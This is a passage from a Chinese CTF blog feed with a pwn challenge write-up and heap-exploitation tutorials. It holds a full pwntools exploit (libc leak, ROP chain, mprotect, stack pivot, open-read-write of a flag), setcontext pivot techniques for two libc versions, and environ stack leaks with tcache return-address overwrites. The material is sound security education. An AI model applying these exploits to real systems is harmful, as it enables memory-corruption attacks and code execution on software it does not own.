ZF标志位为0<br>随后sys call系统调用就可以执行write函数 泄露libc基址 随后Jnz根据ZF标准位 为1 所以跳转<br>再次逻辑右移 此时edi为0 and以后 结果为0 eax为0 ZF标志位为0 syscall系统调用read函数<br>Jnz不跳转 ret指令将rsp指针指向的内容 此时是我们填入的rop链 弹入到rip寄存器 成功劫持程序执行流 听我这么说可能还是不太明白 建议自己动调一步步跟着看 另外可以看一下那位师傅的博客 里面有详细的shellcode编写思路</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">io.send(<span class="keyword">asm</span>(shellcode))</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))-(<span class="number">0x7f009903b4c0</span><span class="number">-0x7f0098e4d000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+hex(libc_addr))</span><br><span class="line">mprotect_addr = libc_addr + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">rdi_addr = libc_addr + libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)).__next__()</span><br><span class="line">rsi_addr = libc_addr + libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)).__next__()</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x000000000011c1e1</span></span><br><span class="line">rax_addr = libc_addr + libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rax;ret;&#x27;</span>)).__next__()</span><br><span class="line">ret_addr = libc_addr + libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;ret;&#x27;</span>)).__next__()</span><br><span class="line">syscall = libc_addr + <span class="number">0x000000000002584d</span></span><br><span class="line">rsp_addr = libc_addr + <span class="number">0x0000000000032b5a</span></span><br><span class="line">rop1 = p64(rdi_addr)+p64(<span class="number">0x2023000</span>)</span><br><span class="line">rop1 += p64(rsi_addr)+p64(<span class="number">0x1000</span>)</span><br><span class="line">rop1 += p64(rdx_addr)+p64(<span class="number">7</span>) + p64(<span class="number">0</span>)+ p64(mprotect_addr)</span><br><span class="line">rop1 += p64(rdi_addr)+p64(<span class="number">0</span>)</span><br><span class="line">rop1 += p64(rsi_addr)+p64(<span class="number">0x2023500</span>)</span><br><span class="line">rop1 += p64(rdx_addr)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">rop1 += p64(rsp_addr)+p64(<span class="number">0x2023508</span>)</span><br><span class="line">io.send(rop1)</span><br></pre></td></tr></table></figure><p>求出libc基址以后 我们就可以构造rop链了 按照原来的思路 就是调用mprotect把0x2023000的权限开一开 然后read读入orw<br>另外没有单独的pop_rdx指令 这里我用的是pop rdx,pop r12的<br>然后最后就是劫持rsp 迁移到0x2023508 8字节要用来存flag字符串<br>之所以要多0x500的话 是因为到时候栈空间不够 会跑到0x2022000这一个页 但是这个页没有可写权限 所以执行不下去 要抬高栈<br>随后就是老一套的orw了<br>到这里就结束了 不得不说这题出的是真的巧妙 完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28793)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Try to ORW in limited bytes!&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    movq rsp,xmm2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    shr edi, 13</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    and eax, edi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    jnz l</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">io.send(asm(shellcode))</span><br><span class="line"></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-(<span class="number">0x7f009903b4c0</span>-<span class="number">0x7f0098e4d000</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">mprotect_addr = libc_addr + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rdi_addr = libc_addr + libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">rsi_addr = libc_addr + libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x000000000011c1e1</span></span><br><span class="line"></span><br><span class="line">rax_addr = libc_addr + libc.search(asm(<span class="string">&#x27;pop rax;ret;&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">ret_addr = libc_addr + libc.search(asm(<span class="string">&#x27;ret;&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">syscall = libc_addr + <span class="number">0x000000000002584d</span></span><br><span class="line"></span><br><span class="line">rsp_addr = libc_addr + <span class="number">0x0000000000032b5a</span></span><br><span class="line"></span><br><span class="line">rop1 = p64(rdi_addr)+p64(<span class="number">0x2023000</span>)</span><br><span class="line"></span><br><span class="line">rop1 += p64(rsi_addr)+p64(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">rop1 += p64(rdx_addr)+p64(<span class="number">7</span>) + p64(<span class="number">0</span>)+ p64(mprotect_addr)</span><br><span class="line"></span><br><span class="line">rop1 += p64(rdi_addr)+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">rop1 += p64(rsi_addr)+p64(<span class="number">0x2023500</span>)</span><br><span class="line"></span><br><span class="line">rop1 += p64(rdx_addr)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line"></span><br><span class="line">rop1 += p64(rsp_addr)+p64(<span class="number">0x2023508</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))</span></span><br><span class="line"></span><br><span class="line">io.send(rop1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = shellcraft.open(&#x27;./flag\x00\x00&#x27;,0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += shellcraft.read(3,0x2023100,0x30)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += shellcraft.write(2,0x2023100,0x30)</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x2023500</span></span><br><span class="line"></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">3</span>) + p64(rsi_addr) + p64(flag_addr+<span class="number">0x100</span>) + p64(rdx_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) +p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">1</span>) + p64(rsi_addr) + p64(flag_addr+<span class="number">0x100</span>) + p64(rdx_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) +p64(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span>+io.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>setcontext构造rop链</title>
      <link href="/2023/03/19/setcontext%E6%9E%84%E9%80%A0rop%E9%93%BE/"/>
      <url>/2023/03/19/setcontext%E6%9E%84%E9%80%A0rop%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>用途比较大的一个办法 通常适用的是开启了沙盒的堆 然后用来构造orw链<br>不过libc2.29是一个比较大的分水岭 前后的版本关于setcontext的利用不一样</p><h1 id="libc2-27"><a href="#libc2-27" class="headerlink" title="libc2.27"></a>libc2.27</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000052070</span>                 public setcontext ; weak</span><br><span class="line">.text:<span class="number">0000000000052070</span> setcontext      proc near               ; CODE XREF: sub_586B0+C↓p</span><br><span class="line">.text:<span class="number">0000000000052070</span>                                         ; DATA XREF: LOAD:<span class="number">0000000000009018</span>↑o</span><br><span class="line">.text:<span class="number">0000000000052070</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000052070</span>                 push    rdi</span><br><span class="line">.text:<span class="number">0000000000052071</span>                 lea     rsi, [rdi+<span class="number">128</span>h] ; nset</span><br><span class="line">.text:<span class="number">0000000000052078</span>                 xor     edx, edx        ; oset</span><br><span class="line">.text:<span class="number">000000000005207</span>A                 mov     edi, <span class="number">2</span>          ; how</span><br><span class="line">.text:<span class="number">000000000005207F</span>                 mov     r10d, <span class="number">8</span>         ; sigsetsize</span><br><span class="line">.text:<span class="number">0000000000052085</span>                 mov     eax, <span class="number">0</span>Eh</span><br><span class="line">.text:<span class="number">000000000005208</span>A                 syscall                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:<span class="number">000000000005208</span>C                 pop     rdi</span><br><span class="line">.text:<span class="number">000000000005208</span>D                 cmp     rax, <span class="number">0F</span>FFFFFFFFFFFF001h</span><br><span class="line">.text:<span class="number">0000000000052093</span>                 jnb     <span class="type">short</span> loc_520F0</span><br><span class="line">.text:<span class="number">0000000000052095</span>                 mov     rcx, [rdi+<span class="number">0E0</span>h]</span><br><span class="line">.text:<span class="number">000000000005209</span>C                 fldenv  byte ptr [rcx]</span><br><span class="line">.text:<span class="number">000000000005209</span>E                 ldmxcsr dword ptr [rdi+<span class="number">1</span>C0h]</span><br><span class="line">.text:<span class="number">00000000000520</span>A5                 mov     rsp, [rdi+<span class="number">0</span>A0h]</span><br><span class="line">.text:<span class="number">00000000000520</span>AC                 mov     rbx, [rdi+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">00000000000520B</span>3                 mov     rbp, [rdi+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">00000000000520B</span>7                 mov     r12, [rdi+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">00000000000520B</span>B                 mov     r13, [rdi+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">00000000000520B</span>F                 mov     r14, [rdi+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">00000000000520</span>C3                 mov     r15, [rdi+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">00000000000520</span>C7                 mov     rcx, [rdi+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">00000000000520</span>CE                 push    rcx</span><br><span class="line">.text:<span class="number">00000000000520</span>CF                 mov     rsi, [rdi+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">00000000000520</span>D3                 mov     rdx, [rdi+<span class="number">88</span>h]</span><br><span class="line">.text:<span class="number">00000000000520</span>DA                 mov     rcx, [rdi+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">00000000000520E1</span>                 mov     r8, [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">00000000000520E5</span>                 mov     r9, [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">00000000000520E9</span>                 mov     rdi, [rdi+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">00000000000520E9</span> ; &#125; <span class="comment">// starts at 52070</span></span><br><span class="line">.text:<span class="number">00000000000520</span>ED ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000000520</span>ED                 xor     eax, eax</span><br><span class="line">.text:<span class="number">00000000000520</span>EF                 retn</span><br></pre></td></tr></table></figure><p>你可以在libc文件中搜索函数setcontext找到这一串汇编<br>前面的指令没啥用 重点是 <strong>.text:00000000000520A5                 mov     rsp, [rdi+0A0h]</strong> 这一句<br>rsp寄存器的值由rdi寄存器决定的 rdi可太好控制了 我们执行free函数 rdi的值就是被释放的chunk的用户区地址<br>但是光控制rsp寄存器也没用 他不执行啊 还得再把rop链弹到rip寄存器里面<br>那就要用到ret指令了是吧 往下看一看 找到了 <strong>.text:00000000000520CE                 push    rcx</strong><br>把rcx的值入栈 rcx能不能控制啊 能啊 <strong>.text:00000000000520C7                 mov     rcx, [rdi+0A8h]</strong><br>那就意味着 我们可以利用这三行 实现一个栈迁移 劫持程序执行流<br>并且所需要的只是覆盖free_hook<br>演示的话 可以看一看wp分类里的Ciscn复现里的一题</p><h1 id="libc2-29"><a href="#libc2-29" class="headerlink" title="libc2.29"></a>libc2.29</h1><p>2.29对于setcontext进行了优化 不好利用了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000055E00</span>                 public setcontext ; weak</span><br><span class="line">.text:<span class="number">0000000000055E00</span> setcontext      proc near               ; CODE XREF: sub_5C160+C↓p</span><br><span class="line">.text:<span class="number">0000000000055E00</span>                                         ; DATA XREF: LOAD:<span class="number">000000000000</span>C6D8↑o</span><br><span class="line">.text:<span class="number">0000000000055E00</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000055E00</span>                 push    rdi</span><br><span class="line">.text:<span class="number">0000000000055E01</span>                 lea     rsi, [rdi+<span class="number">128</span>h] ; nset</span><br><span class="line">.text:<span class="number">0000000000055E08</span>                 xor     edx, edx        ; oset</span><br><span class="line">.text:<span class="number">0000000000055E0</span>A                 mov     edi, <span class="number">2</span>          ; how</span><br><span class="line">.text:<span class="number">0000000000055E0</span>F                 mov     r10d, <span class="number">8</span>         ; sigsetsize</span><br><span class="line">.text:<span class="number">0000000000055E15</span>                 mov     eax, <span class="number">0</span>Eh</span><br><span class="line">.text:<span class="number">0000000000055E1</span>A                 syscall                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:<span class="number">0000000000055E1</span>C                 pop     rdx</span><br><span class="line">.text:<span class="number">0000000000055E1</span>D                 cmp     rax, <span class="number">0F</span>FFFFFFFFFFFF001h</span><br><span class="line">.text:<span class="number">0000000000055E23</span>                 jnb     <span class="type">short</span> loc_55E80</span><br><span class="line">.text:<span class="number">0000000000055E25</span>                 mov     rcx, [rdx+<span class="number">0E0</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E2</span>C                 fldenv  byte ptr [rcx]</span><br><span class="line">.text:<span class="number">0000000000055E2</span>E                 ldmxcsr dword ptr [rdx+<span class="number">1</span>C0h]</span><br><span class="line">.text:<span class="number">0000000000055E35</span>                 mov     rsp, [rdx+<span class="number">0</span>A0h]</span><br><span class="line">.text:<span class="number">0000000000055E3</span>C                 mov     rbx, [rdx+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E43</span>                 mov     rbp, [rdx+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E47</span>                 mov     r12, [rdx+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E4</span>B                 mov     r13, [rdx+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E4</span>F                 mov     r14, [rdx+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E53</span>                 mov     r15, [rdx+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E57</span>                 mov     rcx, [rdx+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">0000000000055E5</span>E                 push    rcx</span><br><span class="line">.text:<span class="number">0000000000055E5</span>F                 mov     rsi, [rdx+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E63</span>                 mov     rdi, [rdx+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E67</span>                 mov     rcx, [rdx+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E6</span>E                 mov     r8, [rdx+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E72</span>                 mov     r9, [rdx+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E76</span>                 mov     rdx, [rdx+<span class="number">88</span>h]</span><br><span class="line">.text:<span class="number">0000000000055E76</span> ; &#125; <span class="comment">// starts at 55E00</span></span><br><span class="line">.text:<span class="number">0000000000055E7</span>D ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000055E7</span>D                 xor     eax, eax</span><br><span class="line">.text:<span class="number">0000000000055E7</span>F                 retn</span><br></pre></td></tr></table></figure><p>你可以看到 变成rdx寻址了 不过也不碍事 还是有办法解决<br>介绍一个新的工具 ropper 其可以查询libc文件中的一些gadget</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ropper -f libc文件路径 --search &#x27;指令&#x27;</span><br></pre></td></tr></table></figure><p>就比如此时我们想要 可以修改rdx值的gadget<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212125727.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212125727.png" alt="image.png"></a><br>找到了很多串 远不止图片上这些<br>rdi寄存器还是很好控制的 所以我们想的是利用rdi控制rdx 利用rdx控制rsp 这样利用rdx做一个中间商<br>那就找呗 找啊找啊 找到下面这串<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212127485.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212127485.png" alt="image.png"></a><br>前面的mov 就不提了 可以修改rdx的值 最后的call才是关键呐<br>rdx此时已经被我们操控了 那么[rdx+0x20]也是可被控制的 这里填入setcontext的地址不就好了 此时rdx的值已经被控制了 所以rsp也可以 那么就跟上面一样了<br>实战利用在wp分类中的hgame2023</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于Environ构造rop链</title>
      <link href="/2023/03/19/%E5%9F%BA%E4%BA%8EEnviron%E6%9E%84%E9%80%A0rop%E9%93%BE/"/>
      <url>/2023/03/19/%E5%9F%BA%E4%BA%8EEnviron%E6%9E%84%E9%80%A0rop%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="Environ"><a href="#Environ" class="headerlink" title="Environ"></a>Environ</h1><p>Linux C中environ 变量是一个char** 类型 存储着系统的环境变量<br>编译下面的程序 进行一个实验 进入pwndbg我们来看一下environ指向的地址是哪里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;test2&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">    test1();</span><br><span class="line"></span><br><span class="line">    test2();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303211940250.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303211940250.png" alt="image.png"></a><br>可以看到其指向的其实是栈帧高地址处的环境变量 我们s进入test1函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303211942609.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303211942609.png" alt="image.png"></a><br>可以看到此时environ存储的值距离rbp非常接近 如果我们计算一下偏移 就可以得到栈帧的ret addr地址<br>再加上任意写 就可以做到控制程序执行流</p><h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><h2 id="覆盖retaddr"><a href="#覆盖retaddr" class="headerlink" title="覆盖retaddr"></a>覆盖retaddr</h2><p>这个办法的利用主要是在堆中 对于开启了沙盒的堆 我们只能构造orw 从而获取flag 但是如何执行rop链是一个难点 如果我们得到了ret addr地址 搭配上任意写 就可以劫持程序执行流 从而执行rop链<br><strong>演示环境: ubuntu22 libc依赖2.27 1.0小版本</strong><br><strong>演示附件: 自己编译的 涵盖所有漏洞</strong><br>首先我们利用tcachebin attack 申请到指向environ的chunk (实际做题当然不局限于tcachebin attack)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_addr = gift()</span><br><span class="line">environ_addr = libc_addr + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(environ_addr))</span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>,)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recv()</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#-0x110</span></span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure><p>老生常谈的操作了 不过获取libc基址的那个操作是我编写程序的时候直接给的漏洞 毕竟方便演示嘛<br>那么 获取了栈上的一个地址 要做的当然是计算和ret addr的偏移了<br>这时候会存在两种情况 一种rbp的值指向栈上 下一个字长就是ret addr了 直接看就好了 和泄露出来的偏移大概在0x100-0x200左右 上面的小程序就是这种情况<br>还有一种情况是我的演示程序 其rbp并不指向栈上<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212033587.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212033587.png" alt="image.png"></a><br>这种情况也别怕 断点直接打在栈帧结束前的ret指令 看一下现在的rsp是指向哪里 计算那个地址的偏移就行了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212035615.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212035615.png" alt="image.png"></a><br>如图所示 我计算出来的偏移是0x110 那就依法炮制 利用tcachebin attack任意写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(stack_addr))</span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#4</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4f2c5</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">8</span>,p64(onegadget_addr))</span><br></pre></td></tr></table></figure><p>直接同样也是图方便 直接填了个onegadget 一般是开沙盒的 或者是libc2.34以上的版本没有hook了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212038599.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212038599.png" alt="image.png"></a><br>可以看到覆盖成功了 接下来就劫持了程序执行流</p><h2 id="覆盖函数的retaddr"><a href="#覆盖函数的retaddr" class="headerlink" title="覆盖函数的retaddr"></a>覆盖函数的retaddr</h2><p>这个我感觉比上面那个效果更牛逼一点 上面那种覆盖办法 直接就把程序执行流控死了 执行完你的rop链以后 如果你rop链不返回的话 就直接终止了程序<br>这个办法是覆盖你调用的函数的retaddr 这样也就把调用函数的执行流控制了 main函数的不会<br>当然 还是没逼用 毕竟最后都控执行流了 我们肯定就获取shell或者flag了 还要这程序执行下去什么<br>哎呀 虽然没用 但还是看一看嘛 了解了解<br>比如 这个时候执行一个puts函数 我们s进入<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212048673.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212048673.png" alt="image.png"></a><br>单步执行到这里 继续s进去<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212049066.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212049066.png" alt="image.png"></a><br>待这个子函数执行完了 他肯定要返回父函数的嘛<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212049843.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212049843.png" alt="image.png"></a><br>这个时候你看rsp指针 是吧 和environ存的地址很接近的<br>算一算偏移照样能覆盖 和上题一样的环境 来演示一下<br>既然我们最后执行的是edit函数 所以攻击的应该是read函数的retaddr<br>不过这里先不演示 就比如menu函数的puts函数吧 打这里<br>断点调一下 算一下偏移 直接打<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212057774.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212057774.png" alt="image.png"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(stack_addr))</span><br><span class="line">add(<span 